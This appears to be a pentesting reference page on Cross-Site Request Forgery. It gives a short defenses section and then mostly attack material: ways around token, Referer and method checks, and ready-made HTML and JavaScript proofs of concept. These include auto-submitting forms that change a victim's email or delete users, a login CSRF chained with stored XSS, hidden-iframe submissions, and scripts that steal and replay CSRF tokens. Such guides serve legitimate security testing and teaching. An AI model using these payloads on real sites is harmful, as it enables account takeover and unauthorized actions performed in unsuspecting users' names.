# Cross-Site Request Forgery (CSRF) Explained
Cross-Site Request Forgery (CSRF) is a type of security vulnerability found in web applications. It enables attackers to perform actions on behalf of unsuspecting users by exploiting their authenticated sessions. The attack is executed when a user, who is logged into a victim’s platform, visits a malicious site. This site then triggers requests to the victim’s account through methods like executing JavaScript, submitting forms, or fetching images.
# Quick Check
You could capture the request in Burp and check CSRF protections, and to test from the browser you can click on Copy as fetch and check the request:


<p align="center">
  <img src="https://hacktricks.wiki/en/images/image%20(11)%20(1)%20(1).png" width="900">
</p>

---
# Defending Against CSRF
Several countermeasures can be implemented to protect against CSRF attacks:

• SameSite cookies: This attribute prevents the browser from sending cookies along with cross-site requests. More about SameSite cookies.

• Cross-origin resource sharing: The CORS policy of the victim site can influence the feasibility of the attack, especially if the attack requires reading the response from the victim site. Learn about CORS bypass.

• User Verification: Prompting for the user’s password or solving a captcha can confirm the user’s intent.

• Checking Referrer or Origin Headers: Validating these headers can help ensure requests are coming from trusted sources. However, careful crafting of URLs can bypass poorly implemented checks, such as:

_ Using http://mal.net?orig=http://example.com (URL ends with the trusted URL)

_ Using http://example.com.mal.net (URL starts with the trusted URL)

• Modifying Parameter Names: Altering the names of parameters in POST or GET requests can help in preventing automated attacks.

• CSRF Tokens: Incorporating a unique CSRF token in each session and requiring this token in subsequent requests can significantly mitigate the risk of CSRF. The effectiveness of the token can be enhanced by enforcing CORS.

○ Understanding and implementing these defenses is crucial for maintaining the security and integrity of web applications.

---
# Common pitfalls of defenses

• SameSite pitfalls: SameSite=Lax still allows top-level cross-site navigations like links and form GETs, so many GET-based CSRFs remain possible. See cookie matrix in Hacking with Cookies > SameSite.

• Header checks: Validate Origin when present; if both Origin and Referer are absent, fail closed. Don’t rely on substring/regex matches of Referer that can be bypassed with lookalike domains or crafted URLs, and note the meta name="referrer" content="never" suppression trick.

• Method overrides: Treat overridden methods (_method or override headers) as state-changing and enforce CSRF on the effective method, not just on POST.

• Login flows: Apply CSRF protections to login as well; otherwise, login CSRF enables forced re-authentication into attacker-controlled accounts, which can be chained with stored XSS.

---
# Lack of token
Applications might implement a mechanism to validate tokens when they are present. However, a vulnerability arises if the validation is skipped altogether when the token is absent. Attackers can exploit this by removing the parameter that carries the token, not just its value. This allows them to circumvent the validation process and conduct a Cross-Site Request Forgery (CSRF) attack effectively.

Moreover, some implementations only check that the parameter exists but don’t validate its content, so an empty token value is accepted. In that case, simply submitting the request with csrf= is enough:
```http
POST /admin/users/role HTTP/2
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=guest&role=admin&csrf=
```

---
# CSRF token is not tied to the user session

Applications not tying CSRF tokens to user sessions present a significant security risk. These systems verify tokens against a global pool rather than ensuring each token is bound to the initiating session.

Here’s how attackers exploit this:

1.Authenticate using their own account.

2.Obtain a valid CSRF token from the global pool.

3.Use this token in a CSRF attack against a victim.

This vulnerability allows attackers to make unauthorized requests on behalf of the victim, exploiting the application’s inadequate token validation mechanism.

---
# Method bypass

If the request is using a “weird” method, check if the method override functionality is working. For example, if it’s using a PUT/DELETE/PATCH method you can try to use a POST and send an override, e.g. https://example.com/my/dear/api/val/num?_method=PUT.

This can also work by sending the _method parameter inside a POST body or using override headers:

• X-HTTP-Method

• X-HTTP-Method-Override

• X-Method-Override

Common in frameworks like Laravel, Symfony, Express, and others. Developers sometimes skip CSRF on non-POST verbs assuming browsers can’t issue them; with overrides, you can still reach those handlers via POST.

Example request and HTML PoC:
```http
POST /users/delete HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&_method=DELETE
```
```html
<form method="POST" action="/users/delete">
  <input name="username" value="admin">
  <input type="hidden" name="_method" value="DELETE">
  <button type="submit">Delete User</button>
</form>
```

---
# Custom header token bypass

If the request is adding a custom header with a token to the request as CSRF protection method, then:

• Test the request without the custom token and the header.
• Test the request with exact same length but different token.

# Content-Type change

According to this, in order to avoid preflight requests using POST method these are the allowed Content-Type values:

• application/x-www-form-urlencoded

• multipart/form-data

• text/plain

However, note that the server logic may vary depending on the Content-Type used so you should try the values mentioned and others like application/json,text/xml, application/xml.

Example (from here) of sending JSON data as text/plain:
```html
<html>
  <body>
    <form
      id="form"
      method="post"
      action="https://phpme.be.ax/"
      enctype="text/plain">
      <input
        name='{"garbageeeee":"'
        value='", "yep": "yep yep yep", "url": "https://webhook/"}' />
    </form>
    <script>
      form.submit()
    </script>
  </body>
</html>
```

---
# Bypassing Preflight Requests for JSON Data

When attempting to send JSON data via a POST request, using the Content-Type: application/json in an HTML form is not directly possible. Similarly, utilizing XMLHttpRequest to send this content type initiates a preflight request. Nonetheless, there are strategies to potentially bypass this limitation and check if the server processes the JSON data irrespective of the Content-Type:

1. Use Alternative Content Types: Employ Content-Type: text/plain or Content-Type: application/x-www-form-urlencoded by setting enctype="text/plain" in the form. This approach tests if the backend utilizes the data regardless of the Content-Type.
2. Modify Content Type: To avoid a preflight request while ensuring the server recognizes the content as JSON, you can send the data with Content-Type: text/plain; application/json. This doesn’t trigger a preflight request but might be processed correctly by the server if it’s configured to accept application/json.
3. SWF Flash File Utilization: A less common but feasible method involves using an SWF flash file to bypass such restrictions. For an in-depth understanding of this technique, refer to this post.

# Referrer / Origin check bypass

**Avoid Referrer header**

Applications may validate the ‘Referer’ header only when it’s present. To prevent a browser from sending this header, the following HTML meta tag can be used:
```html
<meta name="referrer" content="never">
```
This ensures the ‘Referer’ header is omitted, potentially bypassing validation checks in some applications.

**Regexp bypasses**

To set the domain name of the server in the URL that the Referrer is going to send inside the parameters you can do:
```html
<html>
  <!-- Referrer policy needed to send the query parameter in the referrer -->
  <head>
    <meta name="referrer" content="unsafe-url" />
  </head>
  <body>
    <script>
      history.pushState("", "", "/")
    </script>
    <form
      action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email"
      method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      // You need to set this or the domain won't appear in the query of the referer header
      history.pushState(
        "",
        "",
        "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net"
      )
      document.forms[0].submit()
    </script>
  </body>
</html>
```

---
# HEAD method bypass

The first part of this CTF writeup is explained that Oak’s source code, a router is set to handle HEAD requests as GET requests with no response body - a common workaround that isn’t unique to Oak. Instead of a specific handler that deals with HEAD reqs, they’re simply given to the GET handler but the app just removes the response body.

Therefore, if a GET request is being limited, you could just send a HEAD request that will be processed as a GET request.

---
# Exploit Examples

### Stored CSRF via user-generated HTML
When rich-text editors or HTML injection are allowed, you can persist a passive fetch that hits a vulnerable GET endpoint. Any user who views the content will automatically perform the request with their cookies.

• If the app uses a global CSRF token that is not bound to the user session, the same token may work for all users, making stored CSRF reliable across victims.

Minimal example that changes the viewer’s email when loaded:
```html
<img src="https://example.com/account/settings?newEmail=attacker@example.com" alt="">
```

### Login CSRF chained with stored XSS
Login CSRF alone may be low impact, but chaining it with an authenticated stored XSS becomes powerful: force the victim to authenticate into an attacker-controlled account; once in that context, a stored XSS in an authenticated page executes and can steal tokens, hijack the session, or escalate privileges.

• Ensure the login endpoint is CSRF-able (no per-session token or origin check) and no user interaction gates block it.

• After forced login, auto-navigate to a page containing the attacker’s stored XSS payload.

Minimal login-CSRF PoC:
```html
<html>
  <body>
    <form action="https://example.com/login" method="POST">
      <input type="hidden" name="username" value="attacker@example.com" />
      <input type="hidden" name="password" value="StrongPass123!" />
      <input type="submit" value="Login" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
      // Optionally redirect to a page with stored XSS in the attacker account
      // location = 'https://example.com/app/inbox';
    </script>
  </body>
</html>
```

###GET using HTML tags
```html
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Other HTML5 tags that can be used to automatically send a GET request are:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="" />
<embed src="..." />
<audio src="...">
  <video src="...">
    <source src="..." type="..." />
    <video poster="...">
      <link rel="stylesheet" href="..." />
      <object data="...">
        <body background="...">
          <div style="background: url('...');"></div>
          <style>
            body {
              background: url("...");
            }
          </style>
          <bgsound src="...">
            <track src="..." kind="subtitles" />
            <input type="image" src="..." alt="Submit Button"
          /></bgsound>
        </body>
      </object>
    </video>
  </video>
</audio>
```

### Form GET request
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>
      history.pushState("", "", "/")
    </script>
    <form method="GET" action="https://victim.net/email/change-email">
      <input type="hidden" name="email" value="some@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

### Form POST request
```html
<html>
  <body>
    <script>
      history.pushState("", "", "/")
    </script>
    <form
      method="POST"
      action="https://victim.net/email/change-email"
      id="csrfform">
      <input
        type="hidden"
        name="email"
        value="some@email.com"
        autofocus
        onfocus="csrfform.submit();" />
      <!-- Way 1 to autosubmit -->
      <input type="submit" value="Submit request" />
      <img src="x" onerror="csrfform.submit();" />
      <!-- Way 2 to autosubmit -->
    </form>
    <script>
      document.forms[0].submit() //Way 3 to autosubmit
    </script>
  </body>
</html>
```

### Form POST request through iframe
```html
<!-- 
The request is sent through the iframe without reloading the page 
-->
<html>
  <body>
    <iframe style="display:none" name="csrfframe"></iframe>
    <form method="POST" action="/change-email" id="csrfform" target="csrfframe">
      <input
        type="hidden"
        name="email"
        value="some@email.com"
        autofocus
        onfocus="csrfform.submit();" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```
### Steal CSRF Token and send a POST request
```js
function submitFormWithTokenJS(token) {
  var xhr = new XMLHttpRequest()
  xhr.open("POST", POST_URL, true)
  xhr.withCredentials = true

  // Send the proper header information along with the request
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded")

  // This is for debugging and can be removed
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
      //console.log(xhr.responseText);
    }
  }

  xhr.send("token=" + token + "&otherparama=heyyyy")
}

function getTokenJS() {
  var xhr = new XMLHttpRequest()
  // This tells it to return the response as an HTML document
  xhr.responseType = "document"
  xhr.withCredentials = true
  // true on the end of here makes the call asynchronous
  xhr.open("GET", GET_URL, true)
  xhr.onload = function (e) {
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
      // Get the document from the response
      page = xhr.response
      // Get the input element
      input = page.getElementById("token")
      // Show the token
      //console.log("The token is: " + input.value);
      // Use the token to submit the form
      submitFormWithTokenJS(input.value)
    }
  }
  // Make the request
  xhr.send(null)
}

var GET_URL = "http://google.com?param=VALUE"
var POST_URL = "http://google.com?param=VALUE"
getTokenJS()
```

### Steal CSRF Token and send a POST request using an iframe and a form
```js
<iframe
  id="iframe"
  src="http://google.com?param=VALUE"
  width="500"
  height="500"
  onload="read()"></iframe>

<script>
  function read() {
    var name = "admin2"
    var token =
      document.getElementById("iframe").contentDocument.forms[0].token.value
    document.writeln(
      '<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">'
    )
    document.writeln(
      '<input id="username" type="text" name="username" value="' +
        name +
        '" /><br />'
    )
    document.writeln(
      '<input id="token" type="hidden" name="token" value="' + token + '" />'
    )
    document.writeln(
      '<input type="submit" name="submit" value="Submit" /><br/>'
    )
    document.writeln("</form>")
    document.forms[0].submit.click()
  }
</script>
```

### CSRF with Socket.IO
```js
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
  let socket = io("http://six.jh2i.com:50022/test")

  const username = "admin"

  socket.on("connect", () => {
    console.log("connected!")
    socket.emit("join", {
      room: username,
    })
    socket.emit("my_room_event", {
      data: "!flag",
      room: username,
    })
  })
</script>
```

